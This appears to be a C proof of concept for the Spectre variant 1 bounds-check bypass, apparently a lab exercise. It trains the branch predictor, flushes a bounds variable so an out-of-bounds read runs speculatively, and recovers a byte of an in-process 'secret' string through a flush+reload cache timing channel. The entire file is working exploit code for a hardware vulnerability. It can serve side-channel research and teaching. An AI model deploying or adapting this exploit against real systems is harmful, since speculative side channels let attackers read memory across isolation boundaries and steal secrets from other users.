#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define CACHE_HIT_THRESHOLD 150 // Adjusted based on test cycles

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char *secret = "Some Secret Value";

typedef struct datablock {
	uint8_t lpad[1000];
	uint8_t rpad[1000];
	uint8_t dat;
//	uint8_t rpad[1000];
} DataBlock;

DataBlock array[256];


/**
 * Sandbox Function - Returns the value of the buffer if you are making a request within
 * its bounds, otherwise returns 0.
 */
uint8_t restrictedAccess(size_t x) {
	if (x <= bound_upper && x >= bound_lower) {
		return buffer[x];
	} else {
		return 0;
	}
}

void flushSideChannel() {
	for (int i = 0; i < 256; i++) {
		array[i].dat = 1;                  // Prevent copy-on-write
		_mm_clflush(&array[i].dat);       // Flush from cache
	}
}

int reloadSideChannel() {
	int secret = -1;
	uint64_t start, end;
	int junk = 0;
	uint64_t min_time = UINT64_MAX;

	for (int i = 0; i < 256; i++) {
		volatile uint8_t *addr = &array[i].dat;
		start = __rdtscp(&junk);
		junk = *addr;
		end = __rdtscp(&junk);
		uint64_t delta = end - start;

		// Uncomment for debug: printf("Index %d: %lu cycles\n", i, delta);

		if (delta < min_time && delta < CACHE_HIT_THRESHOLD) {
			min_time = delta;
			secret = i;
		}
	}
	return secret;
}

/**
 * Abuse the Spectre principle to steal a secret. After calling this
 * function, the cache should be setup in such a way that we can extract the
 * secret value, which is saved at the normally inaccessible location buffer[larger_x]
 */
void spectreAttack(size_t larger_x) {
	volatile int junk = 0;

	// Train the branch predictor
	for (int i = 1; i < 30; i++) {
		_mm_clflush(&bound_upper);
		restrictedAccess(5);  // In-bounds access to train predictor
	}

	// Flush the bound check to force CPU to speculate
	_mm_clflush(&bound_upper);

	// Make speculative access to out-of-bounds secret
	uint8_t value = restrictedAccess(larger_x);  // This may speculatively return secret[0]
	array[value].dat += 1;                       // Access side channel based on secret
}

int main() {
	flushSideChannel();

	size_t index_beyond = (size_t)((size_t)secret - (size_t)buffer);
	fprintf(stderr, "Targeting address %p at offset %zu\n", secret, index_beyond);

	spectreAttack(index_beyond);

	int secret_byte = reloadSideChannel();
	printf("The secret is %d (%c).\n", secret_byte, secret_byte);

	return 0;
}

